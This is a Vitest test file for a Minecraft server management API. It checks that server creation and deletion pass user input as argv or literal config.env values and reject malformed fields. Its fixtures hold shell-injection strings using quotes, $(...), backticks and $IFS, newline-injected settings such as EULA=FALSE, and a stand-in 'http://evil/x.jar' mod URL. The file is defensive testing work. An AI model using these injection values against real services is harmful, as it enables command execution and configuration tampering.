import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import { FastifyInstance } from 'fastify';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

/**
 * User input reaches servers as data, never shell text (#720). Delete runs
 * the real child process against a fake script that records its argv, so a
 * value a shell would interpret shows up as a side effect. Create provisions
 * in TypeScript (#675): the real use case and ServerSpec repository write the
 * files under a temp root (no runtime, no avahi), and the values must land in
 * config.env as given.
 */

const ROOT = mkdtempSync(join(tmpdir(), 'mcctl-api-process-args-'));
const SCRIPTS = join(ROOT, 'scripts');

process.env.MCCTL_ROOT = ROOT;
process.env.AUTH_MODE = 'disabled';
process.env.NODE_ENV = 'test';

// Spy on the real functions: the processes still run.
vi.mock('child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('child_process')>();
  return { ...actual, exec: vi.fn(actual.exec), execFile: vi.fn(actual.execFile), spawn: vi.fn(actual.spawn) };
});

vi.mock('@minecraft-docker/shared', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@minecraft-docker/shared')>()),
  serverExists: vi.fn(),
  getContainerStatus: vi.fn(() => 'not_found'),
  stopContainer: vi.fn(),
}));

// Never fall through to a real (bundled or deployed) create/delete script.
vi.mock('../src/lib/script-resolver.js', () => ({
  resolveScriptPath: (scriptName: string) => ({
    scriptPath: join(SCRIPTS, scriptName),
    scriptsDir: SCRIPTS,
  }),
}));

vi.mock('../src/services/audit-log-service.js', () => ({
  writeAuditLog: vi.fn().mockResolvedValue(undefined),
}));

import { exec, execFile, spawn } from 'child_process';
import {
  serverExists,
  CreateServerUseCase,
  ApiPromptAdapter,
  ShellAdapter,
  ServerRepository,
  ConfigEnvWorldAssignmentAdapter,
  FileServerSpecRepository,
  Paths,
} from '@minecraft-docker/shared';
import { parseEnvDocument } from '@minecraft-docker/shared/utils';
import { serverProvision } from '../src/routes/servers.js';

/** The real provisioning on ROOT, without runtime or avahi. */
function fileProvision(): void {
  serverProvision.createUseCase = () => {
    const paths = new Paths(ROOT);
    return new CreateServerUseCase(
      new ApiPromptAdapter({}),
      new ShellAdapter({ paths }),
      new ServerRepository(paths),
      paths,
      undefined,
      undefined,
      undefined,
      new ConfigEnvWorldAssignmentAdapter(paths),
      { specRepo: new FileServerSpecRepository(paths, undefined, undefined, () => []) }
    );
  };
}

/** The settings the provision wrote to servers/argv-test/config.env. */
function configEnv(): Map<string, string> {
  return parseEnvDocument(readFileSync(join(ROOT, 'servers', 'argv-test', 'config.env'), 'utf-8')).values;
}

const ARGV_FILE = join(ROOT, 'argv');

/** argv the fake script received, one entry per argument. */
function recordedArgv(): string[] {
  return readFileSync(ARGV_FILE, 'utf-8').split('\0').slice(0, -1);
}

const pwned = (tag: string) => existsSync(join(ROOT, `pwned-${tag}`));

describe('Server scripts receive user input as argv, not shell text (#720)', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    mkdirSync(join(ROOT, 'backups', 'meta'), { recursive: true });
    mkdirSync(SCRIPTS, { recursive: true });
    for (const name of ['create-server.sh', 'delete-server.sh']) {
      const script = join(SCRIPTS, name);
      writeFileSync(script, `#!/bin/bash\nprintf '%s\\0' "$@" > "${ARGV_FILE}"\n`);
      chmodSync(script, 0o755);
    }

    const { config } = await import('../src/config/index.js');
    (config as any).mcctlRoot = ROOT;

    const { buildApp } = await import('../src/app.js');
    app = await buildApp();
    await app.ready();
  });

  afterAll(async () => {
    await app.close();
    rmSync(ROOT, { recursive: true, force: true });
  });

  beforeEach(() => {
    vi.clearAllMocks();
    rmSync(ARGV_FILE, { force: true });
    rmSync(join(ROOT, 'servers'), { recursive: true, force: true });
    mkdirSync(join(ROOT, 'servers'), { recursive: true });
    fileProvision();
  });

  describe('POST /api/servers (non-streaming)', () => {
    it('writes seed and modpack version into config.env as given, running no shell', async () => {
      vi.mocked(serverExists).mockReturnValue(false);
      const seed = `-123"; touch "${ROOT}/pwned-seed"; echo "`;
      const modpackVersion = `1.0 $(touch ${ROOT}/pwned-modpack) \`touch ${ROOT}/pwned-tick\``;

      const response = await app.inject({
        method: 'POST',
        url: '/api/servers',
        payload: {
          name: 'argv-test',
          type: 'MODRINTH',
          version: '1.21.1',
          seed,
          modpack: 'fabric-example',
          modpackVersion,
          autoStart: false,
        },
      });

      expect(response.statusCode).toBe(201);
      expect(configEnv().get('SEED')).toBe(seed);
      expect(configEnv().get('MODRINTH_VERSION')).toBe(modpackVersion);
      expect(configEnv().get('MODRINTH_MODPACK')).toBe('fabric-example');
      expect(pwned('seed')).toBe(false);
      expect(pwned('modpack')).toBe(false);
      expect(pwned('tick')).toBe(false);
      expect(exec).not.toHaveBeenCalled();
      expect(spawn).not.toHaveBeenCalled();
    });

    it('writes a world URL with command substitution as given', async () => {
      vi.mocked(serverExists).mockReturnValue(false);
      const worldUrl = 'http://example.com/w.zip?$(touch$IFS$MCCTL_ROOT/pwned-url)';

      const response = await app.inject({
        method: 'POST',
        url: '/api/servers',
        payload: { name: 'argv-test', worldUrl, autoStart: false },
      });

      expect(response.statusCode).toBe(201);
      expect(configEnv().get('WORLD')).toBe(worldUrl);
      expect(pwned('url')).toBe(false);
      expect(exec).not.toHaveBeenCalled();
    });
  });

  describe('create option limits', () => {
    const create = (payload: Record<string, unknown>) =>
      app.inject({ method: 'POST', url: '/api/servers', payload: { name: 'argv-test', ...payload } });

    // These become config.env KEY=value lines, so a line break or a leading
    // quote would add another setting (#726).
    it.each([
      { version: '1.21"; id; "' },
      { version: '1.21\nEULA=FALSE' },
      { version: '1.21/x' },
      { version: '-1.21' },
      { version: '1'.repeat(65) },
      { seed: '123\nRCON_PASSWORD=x' },
      { seed: '123\r' },
      { seed: '"" EULA=FALSE' },
      { seed: 'x\u2028y' },
      { type: 'MODRINTH', modpack: 'pack', modpackVersion: "'' MODS=http://evil/x.jar" },
      { seed: 'x'.repeat(257) },
      { type: 'MODRINTH', modpack: 'pack', modpackVersion: '1.0\nMODS=http://evil/x.jar' },
      { type: 'MODRINTH', modpack: 'pack', modpackVersion: 'x'.repeat(129) },
      { worldUrl: 'http://example.com/w.zip\nEULA=FALSE' },
    ])('rejects %j', async (payload) => {
      vi.mocked(serverExists).mockReturnValue(false);
      const response = await create(payload);
      expect(response.statusCode).toBe(400);
      expect(existsSync(join(ROOT, 'servers', 'argv-test'))).toBe(false);
    });

    it.each([
      { version: '1.21.1' },
      { version: 'LATEST' },
      { version: '24w14a' },
      { version: '1.20.5-rc1' },
      { seed: '-123' },
      { seed: '-9223372036854775808' },
      { seed: 'a long text seed with spaces, commas & symbols! '.repeat(5) },
      { type: 'MODRINTH', modpack: 'pack', modpackVersion: '0.5.1+1.20.1' },
      { type: 'MODRINTH', modpack: 'pack', modpackVersion: 'Release 5 (beta)' },
    ])('accepts %j', async (payload) => {
      vi.mocked(serverExists).mockReturnValue(false);
      const response = await create({ ...payload, autoStart: false });
      expect(response.statusCode, response.body).toBe(201);
      // The seed is trimmed like every create path (WorldOptions); Compose trimmed it from the script's line too.
      const expected = Object.values(payload).filter((v) => v !== 'MODRINTH').map((v) => String(v).trim());
      expect([...configEnv().values()]).toEqual(expect.arrayContaining(expected));
    });
  });

  describe('DELETE /api/servers/:name', () => {
    it('runs delete-server.sh with the name as one argument', async () => {
      vi.mocked(serverExists).mockReturnValue(true);

      const response = await app.inject({ method: 'DELETE', url: '/api/servers/My_Server' });

      expect(response.statusCode).toBe(200);
      expect(recordedArgv()).toEqual(['My_Server', '--force']);
      expect(exec).not.toHaveBeenCalled();
      expect(spawn).toHaveBeenCalledWith(
        'bash',
        [join(SCRIPTS, 'delete-server.sh'), 'My_Server', '--force'],
        expect.objectContaining({ cwd: ROOT, detached: true })
      );
    });

    it('passes --delete-world only when deleteWorld=true (#652)', async () => {
      vi.mocked(serverExists).mockReturnValue(true);

      const keep = await app.inject({ method: 'DELETE', url: '/api/servers/alpha?deleteWorld=false' });
      expect(keep.statusCode).toBe(200);
      expect(recordedArgv()).toEqual(['alpha', '--force']);

      const drop = await app.inject({ method: 'DELETE', url: '/api/servers/alpha?deleteWorld=true' });
      expect(drop.statusCode).toBe(200);
      expect(recordedArgv()).toEqual(['alpha', '--force', '--delete-world']);
    });
  });
});
